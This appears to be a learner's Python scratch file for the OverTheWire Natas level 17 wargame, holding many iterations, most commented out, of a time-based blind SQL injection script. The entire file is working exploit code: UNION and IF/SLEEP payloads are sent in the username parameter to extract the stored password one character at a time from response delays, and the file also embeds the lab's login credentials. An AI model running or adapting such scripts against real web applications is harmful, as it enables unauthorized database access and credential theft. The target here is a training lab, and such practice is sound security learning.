
# import requests
# import string 
# import time

# url = "http://natas17.natas.labs.overthewire.org/"
# auth = ("natas17","KLdAM3VZux8o6TbkbhuaG5KtYjI77tfx")

# charset = string.ascii_letters + string.digits
# found = ""

# for position in range (32):
#     for ch in charset:
#         guess = found + ch

#         payload = f'x" AND IF (password LIKE BINARY "{guess}%", SLEEP(3),0) -- '

#         start = time.time()

#         r = requests.get(url,auth=auth,params={"username":payload})

#         elapsed = time.time() - start

#         if elapsed >= 2.5:
#             found += ch
#             print(f"Position {position+1}: {found}")
#             break
#     else :
#         print("No match found at position", position + 1, "- stopping")
#         break

# print("Final password:", found)


# import requests
# import time

# url = "http://natas17.natas.labs.overthewire.org/"
# auth = ("natas17", "KLdAM3VZux8o6TbkbhuaG5KtYjI77tfx")

# # payload = 'x" AND SLEEP(3) -- '
# payload = 'x" UNION SELECT SLEEP(3), SLEEP(3) -- '

# start = time.time()
# r = requests.get(url, auth=auth, params={"username": payload,"debug": "1"})
# elapsed = time.time() - start

# print(r.text)


# import requests
# import time

# url = "http://natas17.natas.labs.overthewire.org/"
# auth = ("natas17", "KLdAM3VZux8o6TbkbhuaG5KtYjI77tfx")

# payload = 'x" UNION SELECT SLEEP(3), SLEEP(3) -- '

# start = time.time()
# r = requests.get(url, auth=auth, params={"username": payload, "debug": "1"})
# elapsed = time.time() - start

# print(r.text)
# print("Elapsed:", elapsed)


# import requests
# import string
# import time

# url = "http://natas17.natas.labs.overthewire.org/"
# auth = ("natas17", "KLdAM3VZux8o6TbkbhuaG5KtYjI77tfx")

# charset = string.ascii_letters + string.digits
# found = ""

# for position in range(32):
#     for ch in charset:
#         guess = found + ch

#         payload = f'x" UNION SELECT IF((SELECT password FROM users LIMIT 1) LIKE BINARY "{guess}%", SLEEP(3), 0), 2 -- '

#         start = time.time()
#         r = requests.get(url, auth=auth, params={"username": payload})
#         elapsed = time.time() - start

#         if elapsed >= 2.5:
#             found += ch
#             print(f"Position {position+1}: {found}")
#             break
#     else:
#         print("No match found at position", position + 1, "- stopping")
#         break

# print("Final password:", found)

# THIS STOP AT 25 LENGTH INSTEAD OF GIVING 32 LENGTH
# import requests
# import string
# import time

# url = "http://natas17.natas.labs.overthewire.org/"
# auth = ("natas17", "KLdAM3VZux8o6TbkbhuaG5KtYjI77tfx")

# charset = string.ascii_letters + string.digits
# found = ""

# def check(guess):
#     payload = f'x" UNION SELECT IF((SELECT password FROM users LIMIT 1) LIKE BINARY "{guess}%", SLEEP(5), 0), 2 -- '
#     start = time.time()
#     requests.get(url, auth=auth, params={"username": payload})
#     return time.time() - start

# for position in range(32):
#     matched = False
#     for ch in charset:
#         guess = found + ch
#         elapsed = check(guess)
#         if elapsed >= 4.0:
#             found += ch
#             print(f"Position {position+1}: {found}")
#             matched = True
#             break
#     if not matched:
#         print("No match found at position", position + 1, "- retrying whole position once")
#         for ch in charset:
#             guess = found + ch
#             elapsed = check(guess)
#             if elapsed >= 4.0:
#                 found += ch
#                 print(f"Position {position+1} (retry): {found}")
#                 matched = True
#                 break
#     if not matched:
#         print("Still no match at position", position + 1, "- stopping for real")
#         break

# print("Final password:", found)


# FOR TESTING PASSWORD LENGTH

# payload = 'x" UNION SELECT IF((SELECT LENGTH(password) FROM users LIMIT 1) = 32, SLEEP(5), 0), 2 -- '

# start = time.time()
# requests.get(url, auth=auth, params={"username": payload})
# elapsed = time.time() - start

# print("Elapsed:", elapsed)

# APPENDING FOUND CHARACTERS
# import requests
# import string
# import time

# url = "http://natas17.natas.labs.overthewire.org/"
# auth = ("natas17", "KLdAM3VZux8o6TbkbhuaG5KtYjI77tfx")

# charset = string.ascii_letters + string.digits
# found = "0xjsNNjGvHkb7pwgC6PrAyLi"   # resuming from position 25

# TARGET_LENGTH = 32

# def check(guess):
#     payload = f'x" UNION SELECT IF((SELECT password FROM users LIMIT 1) LIKE BINARY "{guess}%", SLEEP(5), 0), 2 -- '
#     start = time.time()
#     requests.get(url, auth=auth, params={"username": payload})
#     return time.time() - start

# while len(found) < TARGET_LENGTH:
#     position = len(found) + 1
#     matched = False
#     for attempt in range(3):
#         for ch in charset:
#             guess = found + ch
#             elapsed = check(guess)
#             if elapsed >= 4.0:
#                 found += ch
#                 print(f"Position {position}: {found}")
#                 matched = True
#                 break
#         if matched:
#             break
#         print(f"No match at position {position}, attempt {attempt+1} failed, retrying...")
#     if not matched:
#         print(f"Giving up at position {position} after 3 attempts")
#         break

# print("Final password:", found)


# import requests
# import time

# url = "http://natas17.natas.labs.overthewire.org/"
# auth = ("natas17", "KLdAM3VZux8o6TbkbhuaG5KtYjI77tfx")

# found = "0xjsNNjGvHkb7pwgC6PrAyLi"

# payload = f'x" UNION SELECT IF((SELECT password FROM users LIMIT 1) LIKE BINARY "{found}%", SLEEP(5), 0), 2 -- '

# start = time.time()
# requests.get(url, auth=auth, params={"username": payload})
# elapsed = time.time() - start

# print("Elapsed:", elapsed)


# import requests
# import time

# url = "http://natas17.natas.labs.overthewire.org/"
# auth = ("natas17", "KLdAM3VZux8o6TbkbhuaG5KtYjI77tfx")
# found = "0xjsNNjGvHkb7pwgC6PrAyLi"

# def timed(payload, label):
#     start = time.time()
#     requests.get(url, auth=auth, params={"username": payload})
#     elapsed = time.time() - start
#     print(f"{label}: {elapsed:.2f}s")

# # 1) Guaranteed-false baseline (should be fast)
# timed(f'x" UNION SELECT IF((SELECT password FROM users LIMIT 1) LIKE BINARY "zzzznomatch%", SLEEP(5), 0), 2 -- ', "Guaranteed FALSE")

# # 2) Guaranteed-true baseline (should be ~5s)
# timed('x" UNION SELECT SLEEP(5), 2 -- ', "Guaranteed TRUE (unconditional)")

# # 3) Our prefix test again
# timed(f'x" UNION SELECT IF((SELECT password FROM users LIMIT 1) LIKE BINARY "{found}%", SLEEP(5), 0), 2 -- ', "Prefix test (repeat)")



# import requests
# import time

# url = "http://natas17.natas.labs.overthewire.org/"
# auth = ("natas17", "KLdAM3VZux8o6TbkbhuaG5KtYjI77tfx")
# found = "0xjsNNjGvHkb7pwgC6PrAyLi"

# def check(guess):
#     payload = f'x" UNION SELECT IF((SELECT password FROM users LIMIT 1) LIKE BINARY "{guess}%", SLEEP(5), 0), 2 -- '
#     start = time.time()
#     requests.get(url, auth=auth, params={"username": payload})
#     return time.time() - start

# for length in range(1, len(found) + 1):
#     prefix = found[:length]
#     elapsed = check(prefix)
#     status = "TRUE" if elapsed >= 3.0 else "false"
#     print(f"Length {length} ({prefix}): {elapsed:.2f}s -> {status}")



# import requests
# import string
# import time

# url = "http://natas17.natas.labs.overthewire.org/"
# auth = ("natas17", "KLdAM3VZux8o6TbkbhuaG5KtYjI77tfx")

# charset = string.ascii_letters + string.digits
# found = "0xjsNNjGvHkb7pwgC6PrAyL"   # verified correct, 23 characters

# TARGET_LENGTH = 32

# def check(guess):
#     payload = f'x" UNION SELECT IF((SELECT password FROM users LIMIT 1) LIKE BINARY "{guess}%", SLEEP(5), 0), 2 -- '
#     start = time.time()
#     requests.get(url, auth=auth, params={"username": payload})
#     return time.time() - start

# while len(found) < TARGET_LENGTH:
#     position = len(found) + 1
#     matched = False
#     for attempt in range(3):
#         for ch in charset:
#             guess = found + ch
#             elapsed = check(guess)
#             if elapsed >= 3.0:
#                 found += ch
#                 print(f"Position {position}: {found}")
#                 matched = True
#                 break
#         if matched:
#             break
#         print(f"No match at position {position}, attempt {attempt+1} failed, retrying...")
#     if not matched:
#         print(f"Giving up at position {position} after 3 attempts")
#         break

# print("Final password:", found)


# import requests
# import time

# url = "http://natas17.natas.labs.overthewire.org/"
# auth = ("natas17", "KLdAM3VZux8o6TbkbhuaG5KtYjI77tfx")
# found = "0xjsNNjGvHkb7pwgC6PrAyLNT0pYCqHd"

# def check(guess):
#     payload = f'x" UNION SELECT IF((SELECT password FROM users LIMIT 1) LIKE BINARY "{guess}%", SLEEP(5), 0), 2 -- '
#     start = time.time()
#     requests.get(url, auth=auth, params={"username": payload})
#     return time.time() - start

# for length in range(20, len(found) + 1):
#     prefix = found[:length]
#     elapsed = check(prefix)
#     status = "TRUE" if elapsed >= 3.0 else "false"
#     print(f"Length {length} ({prefix}): {elapsed:.2f}s -> {status}")



# import requests

# r = requests.get(
#     "http://natas18.natas.labs.overthewire.org/",
#     auth=("natas18", "0xjsNNjGvHkb7pwgC6PrAyLNT0pYCqHd")
# )
# print(r.status_code)
# print(r.text[:500])

# import requests
# import time

# url = "http://natas17.natas.labs.overthewire.org/"
# auth = ("natas17", "KLdAM3VZux8o6TbkbhuaG5KtYjI77tfx")

# payload = 'x" UNION SELECT IF((SELECT username FROM users LIMIT 1) = "natas18", SLEEP(5), 0), 2 -- '

# start = time.time()
# requests.get(url, auth=auth, params={"username": payload})
# elapsed = time.time() - start

# print("Elapsed:", elapsed)

# import requests
# import time

# url = "http://natas17.natas.labs.overthewire.org/"
# auth = ("natas17", "KLdAM3VZux8o6TbkbhuaG5KtYjI77tfx")

# def check(payload):
#     start = time.time()
#     requests.get(url, auth=auth, params={"username": payload})
#     return time.time() - start

# for n in range(1, 20):
#     payload = f'x" UNION SELECT IF((SELECT LENGTH(username) FROM users LIMIT 1) = {n}, SLEEP(5), 0), 2 -- '
#     elapsed = check(payload)
#     if elapsed >= 3.0:
#         print(f"Username length is {n}")
#         break
# else:
#     print("Length not found in range 1-19")


# import requests
# import string
# import time

# url = "http://natas17.natas.labs.overthewire.org/"
# auth = ("natas17", "KLdAM3VZux8o6TbkbhuaG5KtYjI77tfx")

# charset = string.ascii_letters + string.digits
# found = ""

# def check(guess):
#     payload = f'x" UNION SELECT IF((SELECT username FROM users LIMIT 1) LIKE BINARY "{guess}%", SLEEP(5), 0), 2 -- '
#     start = time.time()
#     requests.get(url, auth=auth, params={"username": payload})
#     return time.time() - start

# for position in range(5):
#     matched = False
#     for attempt in range(3):
#         for ch in charset:
#             guess = found + ch
#             elapsed = check(guess)
#             if elapsed >= 3.0:
#                 found += ch
#                 print(f"Position {position+1}: {found}")
#                 matched = True
#                 break
#         if matched:
#             break
#         print(f"No match at position {position+1}, attempt {attempt+1} failed, retrying...")
#     if not matched:
#         print(f"Giving up at position {position+1} after 3 attempts")
#         break

# print("Final username:", found)

# import requests
# import time

# url = "http://natas17.natas.labs.overthewire.org/"
# auth = ("natas17", "KLdAM3VZux8o6TbkbhuaG5KtYjI77tfx")

# payload = 'x" UNION SELECT IF(EXISTS(SELECT 1 FROM users WHERE username="natas18"), SLEEP(5), 0), 2 -- '

# start = time.time()
# requests.get(url, auth=auth, params={"username": payload})
# elapsed = time.time() - start

# print("Elapsed:", elapsed)


import requests
import string
import time

url = "http://natas17.natas.labs.overthewire.org/"
auth = ("natas17", "KLdAM3VZux8o6TbkbhuaG5KtYjI77tfx")

charset = string.ascii_letters + string.digits
found = ""

def check(guess):
    payload = f'x" UNION SELECT IF((SELECT password FROM users WHERE username="natas18") LIKE BINARY "{guess}%", SLEEP(5), 0), 2 -- '
    start = time.time()
    requests.get(url, auth=auth, params={"username": payload})
    return time.time() - start

for position in range(32):
    matched = False
    for attempt in range(3):
        for ch in charset:
            guess = found + ch
            elapsed = check(guess)
            if elapsed >= 3.0:
                found += ch
                print(f"Position {position+1}: {found}")
                matched = True
                break
        if matched:
            break
        print(f"No match at position {position+1}, attempt {attempt+1} failed, retrying...")
    if not matched:
        print(f"Giving up at position {position+1} after 3 attempts")
        break

print("Final password:", found)